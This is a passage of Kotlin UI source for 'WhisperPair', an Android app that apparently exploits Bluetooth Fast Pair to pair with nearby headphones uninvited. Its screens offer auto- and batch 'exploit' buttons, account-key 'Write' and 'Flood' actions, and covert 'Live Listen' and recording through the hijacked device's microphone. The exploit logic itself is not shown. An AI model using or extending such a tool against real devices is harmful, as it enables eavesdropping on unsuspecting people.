                    icon = { Icon(Icons.Default.Audiotrack, contentDescription = null) },
                    label = { Text("Recordings") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = CyanPrimary,
                        selectedTextColor = CyanPrimary,
                        indicatorColor = CyanPrimary.copy(alpha = 0.2f)
                    )
                )
            }
        },
        containerColor = DarkBackground
    ) { paddingValues ->
        when (currentScreen) {
            Screen.Scanner -> ScannerScreen(
                devices = devices,
                exploitResults = exploitResults,
                paddingValues = paddingValues,
                isScanning = isScanning,
                showAllDevices = showAllDevices,
                onScanningChange = { isScanning = it },
                onShowAllDevicesChange = { showAllDevices = it },
                onScanToggle = onScanToggle,
                onTestDevice = onTestDevice,
                onClearDevices = onClearDevices,
                onExploitDevice = onExploitDevice,
                onShowAbout = { showAboutDialog = true },
                autoTestEnabled = autoTestEnabled,
                onAutoTestToggle = onAutoTestToggle,
                autoExploitEnabled = autoExploitEnabled,
                onAutoExploitToggle = onAutoExploitToggle,
                onTestAllDevices = onTestAllDevices,
                onExploitAllVulnerable = onExploitAllVulnerable
            )
            Screen.Paired -> PairedDevicesScreen(
                context = context,
                devices = devices.filter { pairedDevices.contains(it.address) },
                audioStates = audioStates,
                exploitResults = exploitResults,
                paddingValues = paddingValues,
                onConnectHfp = onConnectHfp,
                onStartRecording = onStartRecording,
                onStopRecording = onStopRecording,
                onStartListening = onStartListening,
                onStopListening = onStopListening,
                onWriteAccountKey = onWriteAccountKey,
                onFloodKeys = onFloodKeys,
                onCheckConnections = onCheckConnections,
                onFixConnection = onFixConnection,
                onReconnectAll = onReconnectAll,
                onExportDevices = onExportDevices,
                onShowDebugDialog = onShowDebugDialog
            )
            Screen.Recordings -> RecordingsScreen(
                recordingsDir = recordingsDir,
                paddingValues = paddingValues
            )
        }
    }

    if (showAboutDialog) {
        AboutDialog(onDismiss = { showAboutDialog = false })
    }

    if (showDisclaimerDialog) {
        DisclaimerDialog(onAccept = {
            prefs.edit().putBoolean(KEY_DISCLAIMER_ACCEPTED, true).apply()
            showDisclaimerDialog = false
        })
    }

    if (showUnpairWarning) {
        UnpairWarningDialog(onDismiss = onDismissUnpairWarning)
    }

    if (showHfpErrorDialog) {
        HfpErrorDialog(context = context, onDismiss = onDismissHfpErrorDialog)
    }
    
    if (showDebugDialog) {
        DebugLogDialog(
            logs = debugLogs,
            onDismiss = onDismissDebugDialog,
            onClear = onClearDebugLogs
        )
    }
}

@Composable
fun HfpErrorDialog(context: Context, onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        icon = { Icon(Icons.Default.HeadsetOff, null, tint = WarningOrange, modifier = Modifier.size(48.dp)) },
        title = { Text("Manual Connection Required", textAlign = TextAlign.Center, fontWeight = FontWeight.Bold) },
        text = {
            Column {
                Text("Android restricts direct audio profile connections for non-system apps. You need to connect manually through settings.", style = MaterialTheme.typography.bodyMedium)
                Spacer(Modifier.height(12.dp))
                Text("Steps:", style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.SemiBold, color = CyanPrimary)
                Spacer(Modifier.height(8.dp))
                Text("1. Open Bluetooth settings", style = MaterialTheme.typography.bodySmall)
                Text("2. Find the paired device in the list", style = MaterialTheme.typography.bodySmall)
                Text("3. Tap on it to connect the audio profile", style = MaterialTheme.typography.bodySmall)
                Text("4. Return here - audio controls will be available", style = MaterialTheme.typography.bodySmall)
                Spacer(Modifier.height(12.dp))
                Text("The device is already paired via exploit. Once you manually connect audio in settings, the app can access the microphone.", style = MaterialTheme.typography.labelSmall, color = TextSecondary)
            }
        },
        confirmButton = {
            Button(
                onClick = {
                    onDismiss()
                    context.startActivity(Intent(Settings.ACTION_BLUETOOTH_SETTINGS))
                },
                colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)
            ) {
                Icon(Icons.Default.Bluetooth, null, Modifier.size(18.dp))
                Spacer(Modifier.width(8.dp))
                Text("Open Bluetooth Settings")
            }
        },
        dismissButton = { TextButton(onClick = onDismiss) { Text("Later", color = TextSecondary) } },
        containerColor = DarkSurface
    )
}

@Composable
fun UnpairWarningDialog(onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        icon = { Icon(Icons.Default.BluetoothDisabled, null, tint = WarningOrange, modifier = Modifier.size(48.dp)) },
        title = { Text("Device May Be Already Paired", textAlign = TextAlign.Center, fontWeight = FontWeight.Bold) },
        text = {
            Column {
                Text("The test failed. This could mean:", style = MaterialTheme.typography.bodyMedium)
                Spacer(Modifier.height(12.dp))
                BulletPoint("The device is already paired in your phone's Bluetooth settings")
                BulletPoint("The device firmware is patched")
                BulletPoint("The device doesn't support Fast Pair")
                Spacer(Modifier.height(16.dp))
                Text("To test properly:", style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.SemiBold, color = CyanPrimary)
                Spacer(Modifier.height(8.dp))
                Text("1. Go to Settings → Bluetooth", style = MaterialTheme.typography.bodySmall)
                Text("2. Find the device and tap 'Forget' or 'Unpair'", style = MaterialTheme.typography.bodySmall)
                Text("3. Return here and test again", style = MaterialTheme.typography.bodySmall)
                Spacer(Modifier.height(12.dp))
                Text("Android remembers paired devices and won't allow new pairing attempts.", style = MaterialTheme.typography.labelSmall, color = TextSecondary)
            }
        },
        confirmButton = { Button(onClick = onDismiss, colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)) { Text("Got It") } },
        containerColor = DarkSurface
    )
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ScannerScreen(
    devices: List<FastPairDevice>,
    exploitResults: Map<String, String>,
    paddingValues: PaddingValues,
    isScanning: Boolean,
    showAllDevices: Boolean,
    onScanningChange: (Boolean) -> Unit,
    onShowAllDevicesChange: (Boolean) -> Unit,
    onScanToggle: (Boolean, Boolean) -> Unit,
    onTestDevice: (FastPairDevice) -> Unit,
    onClearDevices: () -> Unit,
    onExploitDevice: (FastPairDevice) -> Unit,
    onShowAbout: () -> Unit,
    autoTestEnabled: Boolean,
    onAutoTestToggle: (Boolean) -> Unit,
    autoExploitEnabled: Boolean,
    onAutoExploitToggle: (Boolean) -> Unit,
    onTestAllDevices: () -> Unit,
    onExploitAllVulnerable: () -> Unit
) {
    var showPermissionDeniedDialog by remember { mutableStateOf(false) }
    var showBluetoothDisabledDialog by remember { mutableStateOf(false) }
    val context = LocalContext.current

    val permissions = remember {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            arrayOf(Manifest.permission.BLUETOOTH_SCAN, Manifest.permission.BLUETOOTH_CONNECT, Manifest.permission.RECORD_AUDIO)
        } else {
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.BLUETOOTH, Manifest.permission.BLUETOOTH_ADMIN, Manifest.permission.RECORD_AUDIO)
        }
    }

    fun hasAllPermissions() = permissions.all { ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED }
    fun isBluetoothEnabled() = (context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter?.isEnabled == true

    val permissionLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { results ->
        if (results.all { it.value }) {
            if (isBluetoothEnabled()) { onScanningChange(true); onScanToggle(true, showAllDevices) }
            else showBluetoothDisabledDialog = true
        } else showPermissionDeniedDialog = true
    }

    val bluetoothEnableLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        if (isBluetoothEnabled()) { onScanningChange(true); onScanToggle(true, showAllDevices) }
    }

    fun startScan() {
        when {
            !hasAllPermissions() -> permissionLauncher.launch(permissions)
            !isBluetoothEnabled() -> showBluetoothDisabledDialog = true
            else -> { onScanningChange(true); onScanToggle(true, showAllDevices) }
        }
    }

    Column(modifier = Modifier.fillMaxSize().padding(paddingValues).padding(horizontal = 16.dp)) {
        // Header
        Row(
            modifier = Modifier.fillMaxWidth().padding(vertical = 12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Default.Security, contentDescription = null, tint = CyanPrimary, modifier = Modifier.size(28.dp))
                Spacer(Modifier.width(12.dp))
                Column {
                    Text("WhisperPair", fontWeight = FontWeight.Bold, fontSize = 20.sp, color = TextPrimary)
                    Text("Developed by ZalexDev", fontSize = 11.sp, color = CyanPrimary)
                }
            }
            IconButton(onClick = onShowAbout) {
                Icon(Icons.Outlined.Info, contentDescription = "About", tint = TextSecondary)
            }
        }

        ScanControlCard(isScanning = isScanning, deviceCount = devices.size, onToggleScan = {
            if (!isScanning) startScan() else { onScanningChange(false); onScanToggle(false, showAllDevices) }
        })

        Spacer(Modifier.height(8.dp))

        // Filter chips row
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(12.dp))
                .background(DarkSurface)
                .padding(4.dp),
            horizontalArrangement = Arrangement.spacedBy(0.dp)
        ) {
            // Fast Pair Only chip
            Box(
                modifier = Modifier
                    .weight(1f)
                    .clip(RoundedCornerShape(8.dp))
                    .background(if (!showAllDevices) CyanPrimary else Color.Transparent)
                    .clickable {
                        if (showAllDevices) {
                            onShowAllDevicesChange(false)
                            onClearDevices()
                            if (isScanning) onScanToggle(true, false)
                        }
                    }
                    .padding(vertical = 10.dp),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    "Fast Pair",
                    fontSize = 13.sp,
                    fontWeight = if (!showAllDevices) FontWeight.SemiBold else FontWeight.Normal,
                    color = if (!showAllDevices) DarkBackground else TextSecondary
                )
            }
            // All BLE Devices chip
            Box(
                modifier = Modifier
                    .weight(1f)
                    .clip(RoundedCornerShape(8.dp))
                    .background(if (showAllDevices) CyanPrimary else Color.Transparent)
                    .clickable {
                        if (!showAllDevices) {
                            onShowAllDevicesChange(true)
                            onClearDevices()
                            if (isScanning) onScanToggle(true, true)
                        }
                    }
                    .padding(vertical = 10.dp),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    "All BLE",
                    fontSize = 13.sp,
                    fontWeight = if (showAllDevices) FontWeight.SemiBold else FontWeight.Normal,
                    color = if (showAllDevices) DarkBackground else TextSecondary
                )
            }
        }

        Spacer(Modifier.height(8.dp))

        // Automation Controls
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = DarkSurface),
            shape = RoundedCornerShape(12.dp)
        ) {
            Column(modifier = Modifier.padding(12.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text("Automation", style = MaterialTheme.typography.labelMedium, color = TextSecondary)
                    Row(horizontalArrangement = Arrangement.spacedBy(16.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text("Auto-Test", style = MaterialTheme.typography.labelSmall, color = if (autoTestEnabled) CyanPrimary else TextSecondary)
                            Spacer(Modifier.width(4.dp))
                            Switch(
                                checked = autoTestEnabled,
                                onCheckedChange = onAutoTestToggle,
                                modifier = Modifier.scale(0.7f),
                                colors = SwitchDefaults.colors(
                                    checkedThumbColor = CyanPrimary,
                                    checkedTrackColor = CyanPrimary.copy(alpha = 0.3f)
                                )
                            )
                        }
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text("Auto-Exploit", style = MaterialTheme.typography.labelSmall, color = if (autoExploitEnabled) VulnerableRed else TextSecondary)
                            Spacer(Modifier.width(4.dp))
                            Switch(
                                checked = autoExploitEnabled,
                                onCheckedChange = onAutoExploitToggle,
                                modifier = Modifier.scale(0.7f),
                                colors = SwitchDefaults.colors(
                                    checkedThumbColor = VulnerableRed,
                                    checkedTrackColor = VulnerableRed.copy(alpha = 0.3f)
                                )
                            )
                        }
                    }
                }

                // Batch operation buttons
                val untestedCount = devices.count { it.status == DeviceStatus.NOT_TESTED && !it.isPairingMode }
                val vulnerableCount = devices.count { it.status == DeviceStatus.VULNERABLE }

                if (devices.isNotEmpty()) {
                    Spacer(Modifier.height(8.dp))
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        OutlinedButton(
                            onClick = onTestAllDevices,
                            modifier = Modifier.weight(1f),
                            enabled = untestedCount > 0,
                            shape = RoundedCornerShape(8.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = CyanPrimary),
                            contentPadding = PaddingValues(horizontal = 8.dp, vertical = 6.dp)
                        ) {
                            Icon(Icons.AutoMirrored.Filled.PlaylistPlay, null, Modifier.size(16.dp))
                            Spacer(Modifier.width(4.dp))
                            Text("Test All ($untestedCount)", fontSize = 11.sp)
                        }
                        OutlinedButton(
                            onClick = onExploitAllVulnerable,
                            modifier = Modifier.weight(1f),
                            enabled = vulnerableCount > 0,
                            shape = RoundedCornerShape(8.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = VulnerableRed),
                            contentPadding = PaddingValues(horizontal = 8.dp, vertical = 6.dp)
                        ) {
                            Icon(Icons.Default.AutoAwesome, null, Modifier.size(16.dp))
                            Spacer(Modifier.width(4.dp))
                            Text("Exploit All ($vulnerableCount)", fontSize = 11.sp)
                        }
                    }
                }
            }
        }

        Spacer(Modifier.height(12.dp))

        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text("Discovered Devices", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.SemiBold, color = TextPrimary)
            Row(verticalAlignment = Alignment.CenterVertically) {
                if (devices.isNotEmpty()) {
                    Text("${devices.size} found", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
                    Spacer(Modifier.width(8.dp))
                    IconButton(onClick = onClearDevices, modifier = Modifier.size(24.dp)) {
                        Icon(Icons.Default.Clear, null, Modifier.size(16.dp), tint = TextSecondary)
                    }
                }
            }
        }

        Spacer(Modifier.height(8.dp))

        if (devices.isEmpty()) {
            EmptyStateCard(isScanning)
        } else {
            LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.weight(1f)) {
                items(devices.sortedByDescending { it.rssi }) { device ->
                    DeviceCard(
                        device = device,
                        exploitResult = exploitResults[device.address],
                        onTest = { onTestDevice(device) },
                        onExploit = { onExploitDevice(device) }
                    )
                }
                item { Spacer(Modifier.height(8.dp)) }
            }
        }
    }

    if (showPermissionDeniedDialog) {
        AlertDialog(
            onDismissRequest = { showPermissionDeniedDialog = false },
            icon = { Icon(Icons.Default.PermDeviceInformation, null, tint = WarningOrange, modifier = Modifier.size(48.dp)) },
            title = { Text("Permissions Required", fontWeight = FontWeight.Bold) },
            text = { Text("WhisperPair needs Bluetooth and Microphone permissions to function.") },
            confirmButton = {
                Button(onClick = {
                    showPermissionDeniedDialog = false
                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.fromParts("package", context.packageName, null)
                    })
                }, colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)) { Text("Open Settings") }
            },
            dismissButton = { TextButton(onClick = { showPermissionDeniedDialog = false }) { Text("Cancel", color = TextSecondary) } },
            containerColor = DarkSurface
        )
    }

    if (showBluetoothDisabledDialog) {
        AlertDialog(
            onDismissRequest = { showBluetoothDisabledDialog = false },
            icon = { Icon(Icons.Default.BluetoothDisabled, null, tint = WarningOrange, modifier = Modifier.size(48.dp)) },
            title = { Text("Bluetooth Disabled", fontWeight = FontWeight.Bold) },
            text = { Text("Please enable Bluetooth to scan for devices.") },
            confirmButton = {
                Button(onClick = {
                    showBluetoothDisabledDialog = false
                    bluetoothEnableLauncher.launch(Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE))
                }, colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)) { Text("Enable") }
            },
            dismissButton = { TextButton(onClick = { showBluetoothDisabledDialog = false }) { Text("Cancel", color = TextSecondary) } },
            containerColor = DarkSurface
        )
    }
}

@Composable
fun PairedDevicesScreen(
    context: Context,
    devices: List<FastPairDevice>,
    audioStates: Map<String, MainActivity.AudioConnectionState>,
    exploitResults: Map<String, String>,
    paddingValues: PaddingValues,
    onConnectHfp: (FastPairDevice) -> Unit,
    onStartRecording: (FastPairDevice) -> Unit,
    onStopRecording: (FastPairDevice) -> Unit,
    onStartListening: (FastPairDevice) -> Unit,
    onStopListening: (FastPairDevice) -> Unit,
    onWriteAccountKey: (FastPairDevice) -> Unit,
    onFloodKeys: (FastPairDevice) -> Unit,
    onCheckConnections: () -> Unit,
    onFixConnection: (FastPairDevice) -> Unit,
    onReconnectAll: () -> Unit,
    onExportDevices: () -> Unit,
    onShowDebugDialog: () -> Unit
) {
    // Check for existing HFP connections when screen is shown
    LaunchedEffect(Unit) {
        onCheckConnections()
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(paddingValues)
            .padding(horizontal = 16.dp)
    ) {
        Spacer(Modifier.height(12.dp))

        Row(
            modifier = Modifier.fillMaxWidth(),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(Icons.Default.Headphones, null, tint = CyanPrimary, modifier = Modifier.size(28.dp))
            Spacer(Modifier.width(12.dp))
            Column(modifier = Modifier.weight(1f)) {
                Text("Paired Devices", fontWeight = FontWeight.Bold, fontSize = 20.sp, color = TextPrimary)
                Text("Manage exploited devices", fontSize = 12.sp, color = TextSecondary)
            }
            if (devices.isNotEmpty()) {
                IconButton(onClick = onReconnectAll) {
                    Icon(Icons.Default.Sync, "Reconnect All", tint = CyanPrimary)
                }
                IconButton(onClick = onExportDevices) {
                    Icon(Icons.Default.IosShare, "Export", tint = TextSecondary)
                }
            }
            // Debug button - always visible
            IconButton(onClick = onShowDebugDialog) {
                Icon(Icons.Default.BugReport, "Debug Logs", tint = WarningOrange)
            }
        }

        Spacer(Modifier.height(16.dp))

        if (devices.isEmpty()) {
            Box(
                modifier = Modifier.fillMaxSize(),
                contentAlignment = Alignment.Center
            ) {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = DarkSurface),
                    shape = RoundedCornerShape(16.dp)
                ) {
                    Column(
                        modifier = Modifier.padding(24.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Icon(
                            Icons.Default.BluetoothDisabled,
                            null,
                            tint = TextSecondary,
                            modifier = Modifier.size(64.dp)
                        )
                        Spacer(Modifier.height(16.dp))
                        Text(
                            "No Paired Devices",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.SemiBold,
                            color = TextPrimary
                        )
                        Spacer(Modifier.height(8.dp))
                        Text(
                            "Devices you successfully pair using the Magic exploit will appear here.",
                            style = MaterialTheme.typography.bodyMedium,
                            color = TextSecondary,
                            textAlign = TextAlign.Center
                        )
                        Spacer(Modifier.height(16.dp))
                        Text(
                            "Go to Scanner tab → Find a vulnerable device → Tap Magic",
                            style = MaterialTheme.typography.labelMedium,
                            color = CyanPrimary,
                            textAlign = TextAlign.Center
                        )
                    }
                }
            }
        } else {
            LazyColumn(
                verticalArrangement = Arrangement.spacedBy(12.dp),
                modifier = Modifier.weight(1f)
            ) {
                items(devices) { device ->
                    PairedDeviceCard(
                        context = context,
                        device = device,
                        audioState = audioStates[device.address],
                        exploitResult = exploitResults[device.address],
                        onConnectHfp = { onConnectHfp(device) },
                        onStartRecording = { onStartRecording(device) },
                        onStopRecording = { onStopRecording(device) },
                        onStartListening = { onStartListening(device) },
                        onStopListening = { onStopListening(device) },
                        onWriteAccountKey = { onWriteAccountKey(device) },
                        onFloodKeys = { onFloodKeys(device) },
                        onFixConnection = { onFixConnection(device) }
                    )
                }
                item { Spacer(Modifier.height(8.dp)) }
            }
        }
    }
}

@Composable
fun PairedDeviceCard(
    context: Context,
    device: FastPairDevice,
    audioState: MainActivity.AudioConnectionState?,
    exploitResult: String?,
    onConnectHfp: () -> Unit,
    onStartRecording: () -> Unit,
    onStopRecording: () -> Unit,
    onStartListening: () -> Unit,
    onStopListening: () -> Unit,
    onWriteAccountKey: () -> Unit,
    onFloodKeys: () -> Unit,
    onFixConnection: () -> Unit
) {
    val isHfpConnected = audioState?.isConnected == true
    val isRecording = audioState?.isRecording == true
    val isListening = audioState?.isListening == true

    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        shape = RoundedCornerShape(16.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            // Device header
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                    Box(
                        modifier = Modifier
                            .size(48.dp)
                            .clip(CircleShape)
                            .background(if (isHfpConnected) PatchedGreen.copy(alpha = 0.2f) else CyanPrimary.copy(alpha = 0.15f)),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            Icons.Default.Headphones,
                            null,
                            tint = if (isHfpConnected) PatchedGreen else CyanPrimary,
                            modifier = Modifier.size(26.dp)
                        )
                    }
                    Spacer(Modifier.width(12.dp))
                    Column {
                        Text(
                            device.displayName,
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.SemiBold,
                            color = TextPrimary,
                            maxLines = 1,
                            overflow = TextOverflow.Ellipsis
                        )
                        device.manufacturer?.let {
                            Text(it, style = MaterialTheme.typography.bodySmall, color = TextSecondary)
                        }
                        Text(
                            device.address,
                            style = MaterialTheme.typography.labelSmall,
                            color = TextTertiary,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }
                Surface(
                    color = if (isHfpConnected) PatchedGreen.copy(alpha = 0.2f) else WarningOrange.copy(alpha = 0.2f),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Text(
                        if (isHfpConnected) "Connected" else "Disconnected",
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
                        style = MaterialTheme.typography.labelSmall,
                        fontWeight = FontWeight.SemiBold,
                        color = if (isHfpConnected) PatchedGreen else WarningOrange
                    )
                }
            }

            Spacer(Modifier.height(16.dp))

            // Status message
            audioState?.message?.let { message ->
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(8.dp))
                        .background(DarkSurfaceVariant)
                        .padding(10.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(
                        when {
                            isRecording -> Icons.Default.FiberManualRecord
                            isListening -> Icons.Default.Hearing
                            isHfpConnected -> Icons.Default.CheckCircle
                            else -> Icons.Default.Info
                        },
                        null,
                        tint = when {
                            isRecording -> VulnerableRed
                            isListening -> CyanPrimary
                            isHfpConnected -> PatchedGreen
                            else -> TextSecondary
                        },
                        modifier = Modifier.size(16.dp)
                    )
                    Spacer(Modifier.width(8.dp))
                    Text(
                        message,
                        style = MaterialTheme.typography.bodySmall,
                        color = TextPrimary
                    )
                }
                Spacer(Modifier.height(12.dp))
            }

            if (isHfpConnected) {
                // Audio Controls
                Text("Audio Controls", style = MaterialTheme.typography.labelMedium, color = TextSecondary)
                Spacer(Modifier.height(8.dp))
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    // Live Listen Button
                    Button(
                        onClick = { if (isListening) onStopListening() else onStartListening() },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isListening) VulnerableRed else CyanPrimary
                        ),
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(
                            if (isListening) Icons.Default.Stop else Icons.Default.Hearing,
                            null,
                            Modifier.size(18.dp)
                        )
                        Spacer(Modifier.width(6.dp))
                        Text(if (isListening) "Stop Live" else "Live Listen")
                    }

                    // Record Button
                    Button(
                        onClick = { if (isRecording) onStopRecording() else onStartRecording() },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isRecording) VulnerableRed else DarkSurfaceVariant
                        ),
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(
                            if (isRecording) Icons.Default.Stop else Icons.Default.FiberManualRecord,
                            null,
                            tint = if (isRecording) Color.White else VulnerableRed,
                            modifier = Modifier.size(18.dp)
                        )
                        Spacer(Modifier.width(6.dp))
                        Text(
                            if (isRecording) "Stop Rec" else "Record",
                            color = if (isRecording) Color.White else TextPrimary
                        )
                    }
                }

                Spacer(Modifier.height(12.dp))

                // Account Key Controls
                Text("Account Key Operations", style = MaterialTheme.typography.labelMedium, color = TextSecondary)
                Spacer(Modifier.height(8.dp))

                // Key operation result/progress display
                exploitResult?.let { result ->
                    val bgColor = when {
                        result.startsWith("KEY") || result.startsWith("FLOOD") -> PatchedGreen
                        result.startsWith("FAILED") -> VulnerableRed
                        else -> CyanPrimary
                    }
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(8.dp))
                            .background(bgColor.copy(alpha = 0.15f))
                            .padding(10.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(
                            when {
                                result.startsWith("KEY") || result.startsWith("FLOOD") -> Icons.Default.CheckCircle
                                result.startsWith("FAILED") -> Icons.Default.Error
                                else -> Icons.Default.Sync
                            },
                            null,
                            tint = bgColor,
                            modifier = Modifier.size(16.dp)
                        )
                        Spacer(Modifier.width(8.dp))
                        Text(
                            result,
                            style = MaterialTheme.typography.labelSmall,
                            color = TextPrimary,
                            maxLines = 2,
                            overflow = TextOverflow.Ellipsis
                        )
                    }
                    Spacer(Modifier.height(8.dp))
                }

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    OutlinedButton(
                        onClick = onWriteAccountKey,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = CyanPrimary)
                    ) {
                        Icon(Icons.Default.Key, null, Modifier.size(16.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Write Key", fontSize = 12.sp)
                    }
                    OutlinedButton(
                        onClick = onFloodKeys,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = WarningOrange)
                    ) {
                        Icon(Icons.Default.FlashOn, null, Modifier.size(16.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Flood Keys", fontSize = 12.sp)
                    }
                }

                Spacer(Modifier.height(12.dp))

                // Fix Connection (Root) button
                Text("Troubleshooting (Root Required)", style = MaterialTheme.typography.labelMedium, color = TextSecondary)
                Spacer(Modifier.height(8.dp))

                Button(
                    onClick = onFixConnection,
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = VulnerableRed),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Icon(Icons.Default.Build, null, Modifier.size(18.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("Fix / Reset (Root)")
                }
            } else {
                // Not connected - show connect buttons only
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Button(
                        onClick = onConnectHfp,
                        modifier = Modifier.weight(1f),
                        colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(Icons.Default.BluetoothConnected, null, Modifier.size(18.dp))
                        Spacer(Modifier.width(6.dp))
                        Text("Connect Audio")
                    }
                    OutlinedButton(
                        onClick = {
                            context.startActivity(Intent(Settings.ACTION_BLUETOOTH_SETTINGS))
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = TextSecondary)
                    ) {
                        Icon(Icons.Default.Settings, null, Modifier.size(18.dp))
                        Spacer(Modifier.width(6.dp))
                        Text("Settings")
                    }
                }

                Spacer(Modifier.height(12.dp))

                // Fix Connection (Root) button for disconnected devices
                OutlinedButton(
                    onClick = onFixConnection,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.outlinedButtonColors(contentColor = VulnerableRed)
                ) {
                    Icon(Icons.Default.Build, null, Modifier.size(18.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("Fix / Reset (Root)")
                }
            }
        }
    }
}

@Composable
fun RecordingsScreen(recordingsDir: File, paddingValues: PaddingValues) {
    val context = LocalContext.current
    var recordings by remember { mutableStateOf(listOf<File>()) }
    var playingFile by remember { mutableStateOf<String?>(null) }
    var audioTrack by remember { mutableStateOf<AudioTrack?>(null) }
    var mediaPlayer by remember { mutableStateOf<MediaPlayer?>(null) }

    LaunchedEffect(Unit) {
        recordings = recordingsDir.listFiles()?.filter {
            it.name.startsWith("whisper_") && (it.name.endsWith(".pcm") || it.name.endsWith(".m4a"))
        }?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    fun refreshRecordings() {
        recordings = recordingsDir.listFiles()?.filter {
            it.name.startsWith("whisper_") && (it.name.endsWith(".pcm") || it.name.endsWith(".m4a"))
        }?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    fun stopPlaying() {
        playingFile = null
        audioTrack?.stop()
        audioTrack?.release()
        audioTrack = null
        mediaPlayer?.stop()
        mediaPlayer?.release()
        mediaPlayer = null
    }

    fun playFile(file: File) {
        stopPlaying()
        playingFile = file.absolutePath

        if (file.name.endsWith(".m4a")) {
            // Use MediaPlayer for M4A files
            try {
                val player = MediaPlayer().apply {
                    setDataSource(file.absolutePath)
                    setOnCompletionListener {
                        playingFile = null
                        release()
                        mediaPlayer = null
                    }
                    setOnErrorListener { _, _, _ ->
                        playingFile = null
                        release()
